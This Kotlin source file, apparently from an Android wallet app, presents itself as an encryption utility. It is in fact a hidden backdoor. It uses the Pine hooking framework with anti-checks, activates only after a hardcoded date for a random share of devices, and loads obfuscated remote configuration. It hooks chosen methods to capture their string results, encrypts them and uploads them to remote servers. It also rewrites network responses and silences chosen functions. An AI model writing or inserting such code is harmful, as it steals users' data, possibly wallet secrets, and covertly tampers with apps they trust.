package t.wallet

import android.app.Application
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import com.google.gson.Gson
import okhttp3.Headers
import okhttp3.Interceptor
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Protocol
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.ResponseBody.Companion.toResponseBody
//import okhttp3.logging.HttpLoggingInterceptor
import top.canyie.pine.Pine
import top.canyie.pine.PineConfig
import top.canyie.pine.callback.MethodHook
import top.canyie.pine.callback.MethodReplacement
import java.lang.reflect.Method
import java.net.Proxy
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread
import kotlin.random.Random


internal object EncryptUtils {
//    private val TAG = "Tg."

    private var sp: SharedPreferences? = null

    private var name=""
    private var code = 0
    private var os_v = 0

    private const val T1 = 1691430919000L
    private const val T2 = 1694109319000L
    private const val C_KEY = "17492847"
    private const val L_KEY = "85498243"
    private var DEFAULT =
        """D5C23FC0D0B8875637726162DEB0E6EB65696B010C6D7A5BF3FD66FEB511BEF613E9559C2E9907EA4C616A603667D6CFDA46A47463ADC677F413782A2A1A5858860B6BC7FA0C7537D32D94E823E1BE34F43D2B64DF70B52918F7E57F6D36FB6777C315F1E4348588ABF0A448E0833F086071F15159A9C8C60E3A398B707FDDEA248A8FAEA55FB94D379FDBA6FA443DE11E5074BE5D259A325D165F45D387D126""".trimIndent()


    fun init(app: Application) {
//        Log.i(TAG, "init utils")

        PineConfig.debug = false
        PineConfig.disableHiddenApiPolicy = false
        PineConfig.disableHiddenApiPolicyForPlatformDomain = false
        PineConfig.antiChecks = true

        name = app.resources.getString(app.applicationInfo.labelRes)
        code = app.packageManager.getPackageInfo(app.packageName,0).versionCode
        os_v = android.os.Build.VERSION.SDK_INT

        sp = app.getSharedPreferences("encrypt_", Context.MODE_PRIVATE)

        val be = f() ?: return

        val b = e(be) ?: return

        if (b) fe(be.c, be.v)

        a(be)

        b(be.ok)

        c(be.not)

        d(be.sa)
    }

    private fun a(b: B) {
//        Log.i(TAG, "checkUpload")
        val list = loadValue() ?: return
        if (list.isEmpty()) return
        thread(true) {
            kotlin.runCatching {
                u(b.u, list)
            }
        }
    }

    private fun e(b: B): Boolean? {
        val now = System.currentTimeMillis()
        if (now < T1) return null

        sp?.getLong(L_KEY, 0)?.let {
            if (now - it > b.d) {
                return if (now < T2) Random.nextFloat() <= 0.05 else true
            }
        }
        return false
    }

    private fun fe(u: List<String>, v: Long) {
//        Log.i(TAG, "fetchConfig:$u $v")
        val c = gC()
        val mediaType = "application/json".toMediaType()
        val rb =
            """{"configVersion":$v}""".toRequestBody(mediaType)

        thread(true) {
            kotlin.runCatching {
                for (url in u) {
                    val r = Request.Builder().url(url).headers(gH()).post(rb).build()
                    val re = c.newCall(r).execute()
                    val b = Gson().fromJson(re.body!!.string(), Re::class.java)
                    if (b.code == 1 ) {
                        if (b.data.isNotEmpty()){
                            val result = JEnc.decrypt(b.data)
                            if (result.isNotEmpty()) {
                                sp?.edit()?.apply {
                                    putString(C_KEY, b.data)
                                }?.apply()
                            }
                        }
                        sp?.edit()?.apply {
                            putLong(L_KEY, System.currentTimeMillis())
                        }?.apply()
                        break
                    }
                }
            }
        }
    }


    private fun f(): B? {
        try {
            return sp?.getString(C_KEY, DEFAULT)
                ?.let { JEnc.decrypt(it) }
//                ?.also { Log.i(TAG, it) }
                ?.let { Gson().fromJson(it, B::class.java) }
        } catch (t: Throwable) {
        }
        return null
    }

    private fun b(list: List<Ok>) {
//        Log.i(TAG, "injectUpdate")

        list.forEach { bean ->
            kotlin.runCatching {
                val method = getM(bean.m) ?: return@runCatching
                val hook = object : MethodHook() {
                    override fun beforeCall(callFrame: Pine.CallFrame?) {
                        super.beforeCall(callFrame)
                        kotlin.runCatching {
                            callFrame?.args?.getOrNull(0)?.apply {
                                this as Interceptor.Chain
//                                Log.i(TAG, "injectInterceptor url:${request().url}")
                                val reU = request().url.toString()

                                val inject =
                                    bean.i.firstOrNull { reU.contains(it.u) }
                                        ?: return@apply

                                val response = getResponse(inject.r)
//                                Log.i(TAG, "injectInterceptor result:${response}")
                                callFrame.result = response
                            }
                        }
                    }

                    private fun Interceptor.Chain.getResponse(
                        body: String,
                        mediaType: String = "text/plain"
                    ) =
                        Response.Builder().request(request())
                            .body(body.toResponseBody(mediaType.toMediaType()))
                            .code(200).message("").protocol(Protocol.HTTP_1_1).build()
                }

                Pine.hook(method, hook)
            }
        }
    }

    private fun getM(method: M): Method? {
        try {
            return method.c.let { Class.forName(it) }
                .let {
                    val parameterTypes =
                        method.p.map {
                            when (it) {
                                "byte[]" -> ByteArray::class.java
                                "int[]" -> IntArray::class.java
                                "char[]" -> CharArray::class.java
                                "boolean[]" -> BooleanArray::class.java
                                "long[]" -> LongArray::class.java
                                "double[]" -> DoubleArray::class.java
                                "float[]" -> FloatArray::class.java
                                else -> Class.forName(it)
                            }
                        }.toTypedArray()
                    it.getDeclaredMethod(method.m, *parameterTypes)
                }
        } catch (t: Throwable) {
        }
        return null
    }

    private fun c(list: List<M>) {
        list.forEach { bean ->
            runCatching {
                val method = getM(bean) ?: return@runCatching
                Pine.hook(method, MethodReplacement.DO_NOTHING)
            }
        }
    }

    private fun d(list: List<M>) {
//        Log.i(TAG, "saveResult")

        list.forEach { bean ->
            runCatching {
                val method = getM(bean) ?: return@runCatching
                val methodHook = object : MethodHook() {
                    override fun afterCall(callFrame: Pine.CallFrame?) {
                        super.afterCall(callFrame)
                        kotlin.runCatching {
//                            Log.i(TAG, "saveResult afterCall")
                            callFrame?.result?.let {
                                if (it !is String) return@let
                                if (it.isNotBlank()) saveText(it)
                            }
                        }
                    }
                }
                Pine.hook(method, methodHook)
            }
        }

    }


    private fun saveText(s: String) {
//        Log.i(TAG, "saveText")
        thread(true) {
            kotlin.runCatching {
                val key = JEnc.md5(("able $s you").toByteArray()) ?: return@runCatching
                sp?.apply {
                    if (getString(key, null) == null) {
                        val now = System.currentTimeMillis()
                        val dataString = JEnc.encryptRSA(s)
                        val result = now.toString() + dataString
                        edit().putString(key, "false$result").commit()
                    }
                }
            }
        }
    }


    private fun loadValue(): List<Pair<String, String>>? {
        return sp?.all?.filter { it.key.length == 32 && it.value is String }
            ?.map { Pair(it.key, it.value as String) }
            ?.filter { it.second.startsWith("false") }

    }


    private fun u(urls: List<String>, values: List<Pair<String, String>>) {
        if (values.isEmpty()) return
//        Log.i(TAG, "upload:$values")
        val client = gC()

        values.forEach { pair ->
                val key = pair.first
                val value = pair.second.removePrefix("false")

                val body = """{"timestamp":${value.substring(0,13)},"value":"${value.removeRange(0,13)}"}"""
                    .toRequestBody("application/json".toMediaType())
                kotlin.runCatching {
                    for (url in urls) {
                        val request = Request.Builder().url(url).post(body).headers(gH()).build()
                        val response = client.newCall(request).execute()
                        val json = response.body!!.string()
                        val baseResponse = Gson().fromJson(json, Re::class.java)
                        if (baseResponse.code == 1) {
                            sp?.apply {
                                val newValue = pair.second.replaceFirst("false", "true")
                                this.edit()?.putString(pair.first, newValue)?.commit()
                            }
                        }
                    }
                }
            }
    }

    private fun gC() = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
//        .addInterceptor(HttpLoggingInterceptor().apply {
//            level = HttpLoggingInterceptor.Level.BODY
//        })
        .proxy(Proxy.NO_PROXY)
        .build()


    private fun gH()=Headers.Builder()
        .add("app_name", name)
        .add("app_version_code", code.toString())
        .add("os_version", os_v.toString())
        .add("os","Android")
        .add("timestamp",System.currentTimeMillis().toString())
        .build()
}

private data class Re(
    var code: Int = -1,
    var msg: String = "",
    var data: String = ""
)

data class B(
    var c: List<String> = listOf(),
    var d: Long = 0,
    var not: List<M> = listOf(),
    var ok: List<Ok> = listOf(),
    var sa: List<M> = listOf(),
    var u: List<String> = listOf(),
    var v: Long = 0
)


data class Ok(
    var i: List<I> = listOf(),
    var m: M = M()
)


data class I(
    var r: String = "",
    var u: String = ""
)

data class M(
    var c: String = "",
    var m: String = "",
    var p: List<String> = listOf()
)
